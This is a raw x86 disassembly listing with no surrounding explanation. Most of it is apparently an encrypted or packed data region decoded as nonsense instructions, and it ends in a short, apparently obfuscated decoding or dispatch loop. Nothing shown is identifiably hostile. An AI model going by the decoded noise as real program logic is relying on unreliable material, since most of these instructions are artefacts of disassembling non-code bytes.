  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fld    TBYTE PTR [eax-0x61581a59]
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	ret    
  403082:	or     eax,0xad1548a4
  403087:	and    DWORD PTR [esi+0x138ae33d],ebx
  40308d:	mov    cl,0x94
  40308f:	ret    0xa16d
  403092:	(bad)  
  403093:	lods   eax,DWORD PTR ds:[esi]
  403094:	(bad)  
  403095:	mov    esp,0x28665566
  40309a:	or     dh,dl
  40309c:	cdq    
  40309d:	adc    BYTE PTR [ecx-0x532be935],al
  4030a3:	int    0xef
  4030a5:	cs inc esp
  4030a7:	dec    edi
  4030a8:	jle    0x403044
  4030aa:	sub    eax,0x8a835f7e
  4030af:	sub    al,BYTE PTR [edx-0x59ae3937]
  4030b5:	test   al,0x5d
  4030b7:	stc    
  4030b8:	retf   
  4030b9:	cld    
  4030ba:	cmp    al,BYTE PTR [edi+0x28c5036b]
  4030c0:	sub    BYTE PTR [eax],cl
  4030c2:	xchg   edx,eax
  4030c3:	lock push ss
  4030c5:	mov    ecx,0x8e4d38ca
  4030ca:	push   ebx
  4030cb:	cmp    BYTE PTR [ecx+0x9c8e59d],bl
  4030d1:	cmp    eax,0x906072f8
  4030d6:	in     eax,dx
  4030d7:	popa   
  4030d8:	jne    0x40310e
  4030da:	pop    ss
  4030db:	xor    DWORD PTR [eax-0x25],ecx
  4030de:	into   
  4030df:	shr    bl,0xd6
  4030e2:	test   al,0x41
  4030e4:	mov    bh,0x61
  4030e6:	(bad)  [eax]
  4030e8:	out    0xc9,al
  4030ea:	sahf   
  4030eb:	add    bl,BYTE PTR [edi+0x29]
  4030ee:	mov    al,ds:0x40abcaf
  4030f3:	popf   
  4030f4:	ret    0x89b9
  4030f7:	push   esi
  4030f8:	call   0xaa3f:0xe87f73e2
  4030ff:	js     0x4030d0
  403101:	sub    al,0x53
  403103:	jmp    0x4030c1
  403105:	es inc esi
  403107:	jnp    0x40314d
  403109:	mov    dl,0xb4
  40310b:	xor    al,BYTE PTR [edi-0x42]
  40310e:	fcmovnu st,st(1)
  403110:	addr16 pushf 
  403112:	shl    BYTE PTR [esi-0x6b],1
  403115:	aam    0xb8
  403117:	sbb    ebp,eax
  403119:	inc    eax
  40311a:	sbb    al,0x86
  40311c:	imul   edi,esp,0xffffffb8
  40311f:	rcl    DWORD PTR [eax],cl
  403121:	ins    BYTE PTR es:[edi],dx
  403122:	cld    
  403123:	out    dx,al
  403124:	push   esp
  403125:	sub    DWORD PTR [edx+ebx*4-0x39],esp
  403129:	addr16 xchg edx,esp
  40312c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40312d:	xchg   edx,eax
  40312e:	loopne 0x40310f
  403130:	fs mov esp,0x7d8092e6
  403136:	dec    ebx
  403137:	enter  0x3333,0x59
  40313b:	push   esi
  40313c:	xchg   ebp,eax
  40313d:	and    BYTE PTR [esi],bh
  40313f:	mov    dl,0xab
  403141:	and    al,0xbb
  403143:	addr16 into 
  403145:	jge    0x403162
  403147:	cwde   
  403148:	scas   al,BYTE PTR es:[di]
  40314a:	dec    esi
  40314b:	mov    ?,WORD PTR [eax]
  40314d:	push   ss
  40314e:	sbb    eax,0xe042a48e
  403153:	rcr    DWORD PTR [eax-0x71],0x14
  403157:	icebp  
  403158:	jae    0x40314d
  40315a:	sbb    eax,0xbb62d2dc
  40315f:	int3   
  403160:	jmp    0x74f9d62c
  403165:	sbb    al,0x1f
  403167:	repnz aaa 
  403169:	ror    DWORD PTR [ebp-0x3c596cfb],1
  40316f:	inc    edx
  403170:	push   edi
  403171:	dec    BYTE PTR [esi]
  403173:	lea    esi,[eax]
  403175:	cmp    ah,ah
  403177:	add    al,ah
  403179:	xchg   esi,eax
  40317a:	retf   0x5139
  40317d:	ds sbb al,dh
  403180:	dec    esp
  403181:	popf   
  403182:	nop
  403183:	pop    ds
  403184:	dec    eax
  403185:	test   eax,0x4be5036d
  40318a:	dec    edi
  40318b:	mov    eax,0xcba93eb1
  403190:	jne    0x403166
  403192:	mov    bl,ch
  403194:	or     DWORD PTR [edi-0x3e],edx
  403197:	sub    DWORD PTR [edx-0xb],0x86824fcd
  40319e:	in     al,dx
  40319f:	mov    cl,0x67
  4031a1:	mov    esp,0x80e445a5
  4031a6:	and    ecx,esp
  4031a8:	sbb    cl,ch
  4031aa:	aam    0xaa
  4031ac:	int3   
  4031ad:	(bad)  
  4031af:	pushf  
  4031b0:	dec    esi
  4031b1:	xchg   ecx,eax
  4031b2:	aam    0x73
  4031b4:	mov    WORD PTR [esi+0x55],es
  4031b7:	push   0xd72444c3
  4031bc:	cdq    
  4031bd:	jge    0x40317d
  4031bf:	aas    
  4031c0:	sub    ecx,edx
  4031c2:	xchg   esp,eax
  4031c3:	pop    ds
  4031c4:	mov    ch,0xbf
  4031c6:	loopne 0x4031c7
  4031c8:	add    ch,ch
  4031ca:	lds    edx,FWORD PTR [edx-0x7f]
  4031cd:	in     al,dx
  4031ce:	jno    0x40323d
  4031d0:	pop    esi
  4031d1:	imul   ecx,DWORD PTR [eax+0xb3f23dc],0x5dc07ecb
  4031db:	pop    ebx
  4031dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031dd:	jo     0x40324e
  4031df:	clc    
  4031e0:	sar    DWORD PTR [esi-0x3e727ee2],1
  4031e6:	cmp    BYTE PTR [esi],dl
  4031e8:	and    esp,edi
  4031ea:	sub    eax,0x56fc1e49
  4031ef:	mov    ds,WORD PTR [ebx]
  4031f1:	inc    eax
  4031f2:	or     esi,esp
  4031f4:	mov    dh,0x5e
  4031f6:	fdivp  st(2),st
  4031f8:	or     dl,BYTE PTR [edx]
  4031fa:	fldcw  WORD PTR [ebp-0x3fba8a77]
  403200:	pop    ebp
  403201:	pop    edi
  403202:	cld    
  403203:	scas   al,BYTE PTR es:[edi]
  403204:	jo     0x403233
  403206:	and    DWORD PTR [edi+edx*4-0x520c3176],0x5
  40320e:	cmc    
  40320f:	and    BYTE PTR [bx-0x19c4],dh
  403214:	popa   
  403215:	ja     0x403288
  403217:	fild   DWORD PTR [ebx+0x40c11008]
  40321d:	mov    ebp,0x46e34227
  403222:	mov    esp,0x184ed424
  403227:	jnp    0x403285
  403229:	fs repz sub edi,esp
  40322d:	ds xor bl,bl
  403230:	lea    edi,[edi+0x604d8558]
  403236:	psubw  mm6,QWORD PTR [edx+0x590bfbe4]
  40323d:	mul    ebx
  40323f:	lods   al,BYTE PTR ds:[esi]
  403240:	jae    0x4031ca
  403242:	push   edx
  403243:	push   es
  403244:	cmp    esp,ecx
  403246:	addr16 sbb esp,edi
  403249:	adc    DWORD PTR [ebp-0x59],esi
  40324c:	mov    ebx,0xe719f092
  403251:	add    cl,BYTE PTR [ebx-0x433fe68c]
  403257:	sti    
  403258:	add    eax,0x505f92cc
  40325d:	loope  0x4031e2
  40325f:	imul   edx,DWORD PTR [eax-0x1a1331a8],0xfffffff9
  403266:	pop    es
  403267:	mov    bh,0x3e
  403269:	xchg   BYTE PTR [esi+0x7ab3423e],dh
  40326f:	cmp    BYTE PTR [edx+0x2713cad8],ah
  403275:	sub    BYTE PTR [ecx+0x56],0x65
  403279:	arpl   WORD PTR [ecx+edi*4],sp
  40327c:	mov    dl,0xca
  40327e:	(bad)  
  40327f:	out    0x3,eax
  403281:	xor    eax,0xbc2e68a1
  403286:	xor    ah,dh
  403288:	int3   
  403289:	in     al,0xed
  40328b:	add    al,0x7c
  40328d:	add    dl,ah
  40328f:	ins    DWORD PTR es:[edi],dx
  403290:	into   
  403291:	inc    esp
  403292:	or     DWORD PTR [edx],edx
  403294:	loop   0x403242
  403296:	jl     0x4032d7
  403298:	pop    ds
  403299:	xor    esp,DWORD PTR [esp+esi*1]
  40329c:	in     eax,dx
  40329d:	pop    ss
  40329e:	repnz push 0xdbc218fd
  4032a4:	add    al,0x85
  4032a6:	std    
  4032a7:	mov    WORD PTR [edi-0x2035a234],cs
  4032ad:	jp     0x403253
  4032af:	sub    eax,DWORD PTR [ecx-0x35]
  4032b2:	out    dx,al
  4032b3:	pop    ecx
  4032b4:	jge    0x403239
  4032b6:	(bad)  
  4032b7:	mov    ah,0x9a
  4032b9:	fcomp  DWORD PTR ds:0xff239f31
  4032bf:	pop    eax
  4032c0:	retf   0xb2d4
  4032c3:	dec    eax
  4032c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c5:	xchg   esp,eax
  4032c6:	or     BYTE PTR [ecx-0x29e75ea0],dh
  4032cc:	xchg   ebp,eax
  4032cd:	inc    ebp
  4032ce:	test   BYTE PTR [esi+0x1e74cefe],al
  4032d4:	and    DWORD PTR [ecx],0xffffff85
  4032d7:	fwait
  4032d8:	sbb    dl,ah
  4032da:	outs   dx,DWORD PTR ds:[esi]
  4032db:	imul   eax,DWORD PTR [eax+0x74],0xffffffb0
  4032df:	push   0x2e
  4032e1:	add    ch,BYTE PTR [ecx-0x7e]
  4032e4:	js     0x403332
  4032e6:	push   eax
  4032e7:	adc    esi,DWORD PTR [esi]
  4032e9:	test   al,0x20
  4032eb:	jl     0x40328e
  4032ed:	or     ebx,esp
  4032ef:	mov    edx,0xeed75445
  4032f4:	das    
  4032f5:	inc    ebx
  4032f6:	lock lock sub al,0x34
  4032fa:	mov    DWORD PTR [ecx-0x62336802],ebp
  403300:	and    eax,0x4a1cceb5
  403305:	(bad)  
  403307:	fcmovne st,st(5)
  403309:	jmp    0x403335
  40330b:	mov    eax,ds:0xd886816b
  403310:	ins    DWORD PTR es:[edi],dx
  403311:	iret   
  403312:	test   al,0x4f
  403314:	mov    bh,0xd2
  403316:	data16 loope 0x40329f
  403319:	inc    edx
  40331a:	mov    WORD PTR [edx],fs
  40331c:	mov    WORD PTR [edx-0x23],cs
  40331f:	stc    
  403320:	sub    BYTE PTR [edi],ah
  403322:	jno    0x403376
  403324:	enter  0xda7f,0xad
  403328:	retf   0x62
  40332b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40332c:	addr16 jmp 0xfdc4f52d
  403332:	push   ebp
  403333:	shl    BYTE PTR [ebp+0x38],cl
  403336:	stos   BYTE PTR es:[edi],al
  403337:	dec    ecx
  403338:	xor    eax,0x9264513a
  40333d:	jne    0x40333e
  40333f:	xor    eax,0x307fd9da
  403344:	pop    ecx
  403345:	pop    edi
  403346:	add    al,0x94
  403348:	mov    ah,0x15
  40334a:	xor    ebp,eax
  40334c:	adc    esp,DWORD PTR [edx+0x79]
  40334f:	xor    bl,dh
  403351:	push   ebp
  403352:	xchg   edi,eax
  403353:	dec    ecx
  403354:	popa   
  403355:	pop    ss
  403356:	adc    DWORD PTR [eax],0x14
  403359:	inc    eax
  40335a:	push   ss
  40335b:	aad    0x6e
  40335d:	cmp    al,BYTE PTR gs:[esi+0x2206149f]
  403364:	scas   eax,DWORD PTR es:[edi]
  403365:	fsubp  st(6),st
  403367:	push   0x824c7af0
  40336c:	aas    
  40336d:	or     esp,DWORD PTR [edi-0x1c550f6c]
  403373:	rcr    BYTE PTR [ebp-0x43ef6696],1
  403379:	mov    DWORD PTR [ecx+edx*8-0x24],esp
  40337d:	jmp    0x40333d
  40337f:	dec    edx
  403380:	xor    al,0xeb
  403382:	aad    0xf3
  403384:	retf   
  403385:	aas    
  403386:	(bad)  
  403387:	or     ch,BYTE PTR [eax+0x2073cc3f]
  40338d:	ss js  0x4033d6
  403390:	out    dx,al
  403391:	xchg   DWORD PTR [edi+0x51a127ce],ebp
  403397:	push   ds
  403398:	aad    0xaa
  40339a:	pop    eax
  40339b:	mov    DWORD PTR [edi+0x9],esi
  40339e:	outs   dx,BYTE PTR ds:[esi]
  40339f:	sub    eax,0xb86fda62
  4033a4:	cwde   
  4033a5:	stos   DWORD PTR es:[edi],eax
  4033a6:	stc    
  4033a7:	push   0x31
  4033a9:	pop    esi
  4033aa:	(bad)  
  4033ab:	push   edi
  4033ac:	iret   
  4033ad:	ins    DWORD PTR es:[edi],dx
  4033ae:	inc    ebp
  4033af:	jne    0x40342b
  4033b1:	icebp  
  4033b2:	fdiv   QWORD PTR [edx-0x29]
  4033b5:	call   0x710b:0xb9187a27
  4033bc:	retf   
  4033bd:	xor    esi,DWORD PTR [eax]
  4033bf:	sbb    DWORD PTR ds:0xef22ec1a,esi
  4033c5:	push   0x35e6884e
  4033ca:	rcl    BYTE PTR [ebx-0x56f9f2a2],0xa4
  4033d1:	scas   eax,DWORD PTR es:[edi]
  4033d2:	jns    0x40341e
  4033d4:	push   0xa67e74f3
  4033d9:	sub    DWORD PTR es:[edx+eiz*8],ebx
  4033dd:	pop    esp
  4033de:	aaa    
  4033df:	xor    BYTE PTR [edx],dh
  4033e1:	pop    esp
  4033e2:	icebp  
  4033e3:	pop    es
  4033e4:	femms  
  4033e6:	add    edi,esp
  4033e8:	mov    ds:0x2adf5b9,eax
  4033ed:	cwde   
  4033ee:	test   al,0xae
  4033f0:	sar    DWORD PTR [esi-0x65adfa5d],cl
  4033f6:	add    eax,0xb802d491
  4033fb:	and    edi,DWORD PTR [esi+0xdfc8e48]
  403401:	xor    BYTE PTR [esi],0xfc
  403404:	mov    dl,0xe7
  403406:	mov    eax,0x736ef30e
  40340b:	jns    0x403464
  40340d:	cmc    
  40340e:	ror    DWORD PTR [ecx+eax*8+0x30],1
  403412:	lods   al,BYTE PTR ds:[esi]
  403413:	fist   DWORD PTR ds:0x8b087d8b
  403419:	aas    
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	lods   eax,DWORD PTR ds:[esi]
  403435:	(bad)  
  403436:	mov    ebp,0x7e7e1e22
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	popf   
  403440:	int    0x4f
  403442:	sub    eax,0x84ab5f3e
  403447:	pop    edi
  403448:	or     DWORD PTR [esi+0xc73276f],ecx
  40344e:	scas   al,BYTE PTR es:[edi]
  40344f:	push   ebp
  403450:	xor    esp,DWORD PTR [edi+0x3f]
  403453:	das    
  403454:	jmp    0xcb08:0xd7b4b2f5
  40345b:	xor    eax,0xbe86f7f6
  403460:	push   edi
  403461:	or     cl,al
  403463:	jbe    0x40348d
  403465:	mov    ah,BYTE PTR ds:0xe05e1526
  40346b:	aas    
  40346c:	pop    ecx
  40346d:	xchg   ebx,eax
  40346e:	xchg   ebx,eax
  40346f:	fmul   QWORD PTR [eax-0x30]
  403472:	mov    bl,0x50
  403474:	hlt    
  403475:	pop    edi
  403476:	sub    ah,ah
  403478:	inc    esp
  403479:	push   0x8ca77c9d
  40347e:	jg     0x4034c3
  403480:	push   0xffffff9b
  403482:	or     eax,DWORD PTR [edx]
  403484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403485:	jns    0x40349d
  403487:	pop    esp
  403488:	inc    ebp
  403489:	or     BYTE PTR [ebx-0x3608a91d],bl
  40348f:	mov    ds:0x4a2e9ac0,eax
  403494:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403496:	nop
  403497:	imul   BYTE PTR [ecx]
  403499:	enter  0x1784,0x12
  40349d:	or     BYTE PTR [edx-0x79],bl
  4034a0:	call   0xc80f:0xc25f75f8
  4034a7:	jo     0x4034dd
  4034a9:	(bad)  
  4034aa:	lahf   
  4034ab:	jmp    0xbdd5:0xe13f62da
  4034b2:	cmc    
  4034b3:	mov    dh,0xf9
  4034b5:	and    DWORD PTR [edx+eax*8+0x114ac70d],esp
  4034bc:	ret    0xbd21
  4034bf:	ja     0x403484
  4034c1:	mov    al,BYTE PTR [eax+0xa]
  4034c4:	xor    bl,BYTE PTR [edi]
  4034c6:	out    0xa5,eax
  4034c8:	ds rcl eax,0xba
  4034cc:	add    bl,BYTE PTR [edx]
  4034ce:	loop   0x4034ab
  4034d0:	loopne 0x4034ad
  4034d2:	aas    
  4034d3:	rol    dh,1
  4034d5:	push   esi
  4034d6:	std    
  4034d7:	xchg   ebp,eax
  4034d8:	sub    ah,BYTE PTR [ebp-0x2c]
  4034db:	or     BYTE PTR [esi],0x24
  4034de:	outs   dx,BYTE PTR ds:[esi]
  4034df:	cmc    
  4034e0:	xor    ebp,DWORD PTR [edi]
  4034e2:	cld    
  4034e3:	add    eax,0xa88f7b33
  4034e8:	push   ss
  4034e9:	xchg   DWORD PTR [esi+0x554be520],ebp
  4034ef:	ins    BYTE PTR es:[edi],dx
  4034f0:	ret    0x9d97
  4034f3:	ins    BYTE PTR es:[edi],dx
  4034f4:	addr16 ret 0xf5c8
  4034f8:	(bad)  
  4034f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034fa:	sahf   
  4034fb:	sbb    al,0xeb
  4034fd:	cli    
  4034fe:	test   DWORD PTR [esi-0x22],edx
  403501:	fwait
  403502:	std    
  403503:	dec    esi
  403504:	inc    edi
  403505:	leave  
  403506:	mov    esi,DWORD PTR [ecx-0x6c]
  403509:	sub    esp,DWORD PTR [eax]
  40350b:	jnp    0x4034d2
  40350d:	mov    eax,ds:0x61f9fb5a
  403512:	inc    ebp
  403513:	clc    
  403514:	shl    ch,0x66
  403517:	inc    edx
  403518:	lahf   
  403519:	xchg   ebp,eax
  40351a:	dec    ebx
  40351b:	fld    QWORD PTR gs:[esi-0xa24f483]
  403522:	je     0x403530
  403524:	xchg   bl,ah
  403526:	push   esp
  403527:	std    
  403528:	out    dx,eax
  403529:	lds    edx,FWORD PTR [edi+0x6d5cbab9]
  40352f:	cmc    
  403530:	sbb    eax,0xa8057ad8
  403535:	adc    edi,edi
  403537:	or     bh,0x8c
  40353a:	add    eax,0x4c38f57b
  40353f:	mov    esi,DWORD PTR [edx]
  403541:	mov    ch,0xb7
  403543:	add    eax,0xecab32fa
  403548:	sti    
  403549:	stos   DWORD PTR es:[edi],eax
  40354a:	push   cs
  40354b:	clc    
  40354c:	sub    DWORD PTR [ecx],0x75
  40354f:	cwde   
  403550:	ror    BYTE PTR [esi+0x18498947],cl
  403556:	jns    0x40357a
  403558:	adc    DWORD PTR [ebp-0x30d96f5c],ecx
  40355e:	stc    
  40355f:	out    dx,eax
  403560:	shr    DWORD PTR [ecx-0x25],cl
  403563:	sbb    BYTE PTR [ebp+0x335aa091],dh
  403569:	adc    al,0x7
  40356b:	mov    DWORD PTR [edx+0x7454fa3f],edi
  403571:	leave  
  403572:	jns    0x4035c8
  403574:	shl    DWORD PTR [ebx+esi*4-0x2df0a1f8],1
  40357b:	mov    bl,0x15
  40357d:	retf   0xd7d7
  403580:	cmp    al,0xbb
  403582:	rcl    ebx,0x1e
  403585:	jmp    0x40353e
  403587:	lods   al,BYTE PTR ds:[esi]
  403588:	add    eax,0xadd66b8a
  40358d:	test   eax,0x561415a2
  403592:	in     eax,0x68
  403594:	pop    ss
  403595:	mov    edx,0x39179c6e
  40359a:	outs   dx,DWORD PTR ds:[esi]
  40359b:	jbe    0x403603
  40359d:	stc    
  40359e:	sbb    al,0xbb
  4035a0:	add    esp,edx
  4035a2:	fdivr  st(2),st
  4035a4:	push   ecx
  4035a5:	inc    edx
  4035a6:	pop    ss
  4035a7:	lds    edi,FWORD PTR [edx-0x52ab5b75]
  4035ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ae:	or     esp,DWORD PTR [edi]
  4035b0:	(bad)  
  4035b1:	(bad)  [esi]
  4035b3:	push   ds
  4035b4:	gs jge 0x4035cb
  4035b7:	loop   0x403626
  4035b9:	add    dh,BYTE PTR [bp+si]
  4035bc:	(bad)  
  4035bd:	(bad)  
  4035be:	sbb    esi,DWORD PTR ds:0xeae14659
  4035c4:	mov    eax,0x8da71c96
  4035c9:	leave  
  4035ca:	imul   eax,DWORD PTR [ecx],0xa78ee8c1
  4035d0:	mov    esp,0x779be932
  4035d5:	icebp  
  4035d6:	neg    dl
  4035d8:	add    ch,bl
  4035da:	stos   BYTE PTR es:[edi],al
  4035db:	(bad)  
  4035dc:	fsubr  QWORD PTR ds:0x3ba2cd92
  4035e2:	retf   
  4035e3:	(bad)  
  4035e4:	fs lock inc esp
  4035e7:	xchg   esi,eax
  4035e8:	mov    esp,ss
  4035ea:	jecxz  0x4035c3
  4035ec:	adc    eax,0x72d796e7
  4035f1:	ror    DWORD PTR [esi],1
  4035f3:	scas   eax,DWORD PTR es:[edi]
  4035f4:	sahf   
  4035f5:	fs (bad) 
  4035f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035f8:	(bad)  
  4035f9:	push   ecx
  4035fa:	ds ret 
  4035fc:	repnz hlt 
  4035fe:	div    BYTE PTR [esi+ebx*8-0x74]
  403602:	mov    DWORD PTR [ebp-0x2d],edi
  403605:	dec    edx
  403606:	adc    BYTE PTR [esp+ecx*1+0x4a],dh
  40360a:	pusha  
  40360b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360c:	and    BYTE PTR [eax-0x1ac74ab],ah
  403612:	jmp    0x4035ad
  403614:	cs pop ebx
  403616:	mov    eax,es:0x2d2f27ad
  40361c:	(bad)  
  40361e:	out    0x5c,al
  403620:	aam    0xbc
  403622:	jb     0x403663
  403624:	sub    cl,BYTE PTR [edi]
  403626:	stc    
  403627:	add    DWORD PTR ds:0x7d4fee03,eax
  40362d:	mov    dh,0xf5
  40362f:	xor    DWORD PTR [ecx+0x16],0x17
  403633:	dec    ebx
  403634:	jns    0x403699
  403636:	xlat   BYTE PTR ds:[ebx]
  403637:	(bad)
  40363c:	imul   ebp,DWORD PTR ds:0x5437c649,0x2e
  403643:	push   0x518c92d2
  403648:	jnp    0x403688
  40364a:	inc    edi
  40364b:	aad    0xbf
  40364d:	ret    
  40364e:	fld    st(5)
  403650:	rol    DWORD PTR ss:0x8c391faa,0xd7
  403658:	out    dx,al
  403659:	pop    esp
  40365a:	adc    esi,DWORD PTR [edx]
  40365c:	adc    al,0x71
  40365e:	cmp    BYTE PTR [ebx-0x6d44225a],ch
  403664:	sbb    DWORD PTR [ebx],0x30
  403667:	push   esi
  403668:	cli    
  403669:	rcl    BYTE PTR [esp+ecx*1+0x26],cl
  40366d:	mov    dh,0x59
  40366f:	inc    edx
  403670:	xchg   ebp,eax
  403671:	leave  
  403672:	mov    edx,0x16c8b45f
  403677:	pop    ebp
  403678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403679:	xor    BYTE PTR [ebp+0x49],dl
  40367c:	inc    edx
  40367d:	pop    esp
  40367e:	and    al,0xaf
  403680:	jmp    FWORD PTR [ebx+0x6a]
  403683:	out    dx,al
  403684:	inc    esp
  403685:	cli    
  403686:	stc    
  403687:	xor    eax,0x2ab166b3
  40368c:	sar    BYTE PTR ds:0xceea575,cl
  403692:	loopne 0x4036a0
  403694:	ja     0x4036b0
  403696:	adc    edx,DWORD PTR [edx]
  403698:	inc    eax
  403699:	shl    esi,1
  40369b:	icebp  
  40369c:	push   es
  40369d:	jae    0x4036b9
  40369f:	jp     0x403716
  4036a1:	push   ebx
  4036a2:	iret   
  4036a3:	jno    0x40370a
  4036a5:	mov    dh,0x33
  4036a7:	lock rep lods eax,DWORD PTR ds:[esi]
  4036aa:	aam    0x8d
  4036ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ad:	pop    esi
  4036ae:	in     eax,dx
  4036af:	repnz out dx,eax
  4036b1:	xchg   edi,eax
  4036b2:	(bad)  
  4036b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b4:	jp     0x403645
  4036b6:	jmp    0x403732
  4036b8:	cld    
  4036b9:	xchg   ebp,eax
  4036ba:	push   ebx
  4036bb:	rol    BYTE PTR [edx-0x35],cl
  4036be:	and    BYTE PTR [edx],bl
  4036c0:	loop   0x403677
  4036c2:	imul   esp,DWORD PTR [ecx+0x4bc1d7a8],0xe679d9cc
  4036cc:	sbb    eax,0x60300338
  4036d1:	pusha  
  4036d2:	jmp    0xefa9:0xccc150ad
  4036d9:	push   edx
  4036da:	je     0x403745
  4036dc:	mov    dh,0xf9
  4036de:	xor    esi,DWORD PTR [ebx-0x581d655c]
  4036e4:	ret    
  4036e5:	dec    ebp
  4036e6:	mov    esi,DWORD PTR [esi]
  4036e8:	inc    ebp
  4036e9:	call   0x769725b3
  4036ee:	push   esi
  4036ef:	push   esi
  4036f0:	inc    ebx
  4036f1:	mov    esp,0xc262088a
  4036f6:	loop   0x4036c8
  4036f8:	and    DWORD PTR [eax],esp
  4036fa:	inc    esi
  4036fb:	sbb    esi,esp
  4036fd:	setne  BYTE PTR [edi+0x31]
  403701:	push   ds
  403702:	jmp    0x4036a6
  403704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403705:	pop    esp
  403706:	xor    eax,0x15d24e5c
  40370b:	(bad)  
  40370c:	jnp    0x40378c
  40370e:	in     al,0x3d
  403710:	push   esp
  403711:	jnp    0x4036e4
  403713:	add    edx,edx
  403715:	out    dx,al
  403716:	lods   eax,DWORD PTR ds:[esi]
  403717:	leave  
  403718:	mov    ebp,0x726aa408
  40371d:	les    edi,FWORD PTR [edi]
  40371f:	xchg   ecx,eax
  403720:	std    
  403721:	add    dh,ch
  403723:	push   cs
  403724:	leave  
  403725:	lods   eax,DWORD PTR ds:[esi]
  403726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403727:	sbb    dh,BYTE PTR [esi]
  403729:	or     DWORD PTR [ebp+0x5ab295ee],edx
  40372f:	fwait
  403730:	cdq    
  403731:	jle    0x4036e0
  403733:	push   eax
  403734:	imul   edx,DWORD PTR ss:[edi+0x63],0x16736e98
  40373c:	pop    edi
  40373d:	pop    ss
  40373e:	(bad)  
  40373f:	mov    cl,0x79
  403741:	(bad)  
  403742:	xchg   esi,eax
  403743:	call   0x93b2:0x6a64b3dc
  40374a:	out    0xd9,al
  40374c:	pop    ecx
  40374d:	push   es
  40374e:	push   esp
  40374f:	inc    esi
  403750:	mov    ebp,0x64a38aa
  403755:	icebp  
  403756:	ss pop ebp
  403758:	or     eax,DWORD PTR [edx+esi*2]
  40375b:	out    dx,eax
  40375c:	adc    ebp,ebp
  40375e:	fwait
  40375f:	jl     0x40374c
  403761:	sbb    dl,BYTE PTR [ecx+0x4a43c9de]
  403767:	cs pop esi
  403769:	add    eax,0xe33fbde7
  40376e:	mov    ah,bh
  403770:	out    0x37,al
  403772:	push   cs
  403773:	xlat   BYTE PTR ds:[ebx]
  403774:	in     eax,0xd7
  403776:	stos   DWORD PTR es:[edi],eax
  403777:	test   al,0xe8
  403779:	ins    BYTE PTR es:[edi],dx
  40377a:	push   esi
  40377b:	mov    DWORD PTR [ebp+0x728f429],edi
  403781:	in     eax,0x22
  403783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403784:	mov    dl,0x99
  403786:	mov    edi,0x70f8ac06
  40378b:	pop    es
  40378c:	loope  0x4037c3
  40378e:	test   DWORD PTR [eax-0x4f17e8a],0xe18ce78e
  403798:	pop    ds
  403799:	cwde   
  40379a:	pop    es
  40379b:	dec    ebp
  40379c:	cmp    BYTE PTR [edx],cl
  40379e:	(bad)  
  40379f:	icebp  
  4037a0:	push   0x45
  4037a2:	scas   al,BYTE PTR es:[edi]
  4037a3:	leave  
  4037a4:	aad    0xf6
  4037a6:	sub    eax,0x5362d136
  4037ab:	xchg   ebx,eax
  4037ac:	(bad)  
  4037ae:	js     0x40380a
  4037b0:	or     ecx,DWORD PTR [edi+edx*2]
  4037b3:	iret   
  4037b4:	retf   
  4037b5:	pop    eax
  4037b6:	and    eax,0xd75e8647
  4037bb:	or     dh,ah
  4037bd:	daa    
  4037be:	push   edx
  4037bf:	adc    ecx,DWORD PTR [edi]
  4037c1:	hlt    
  4037c2:	sbb    eax,0x693ff213
  4037c7:	mov    ah,BYTE PTR [edi+0x7633783d]
  4037cd:	jp     0x403765
  4037cf:	test   edi,ebx
  4037d1:	ja     0x4037e1
  4037d3:	mov    edx,0x3b06
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
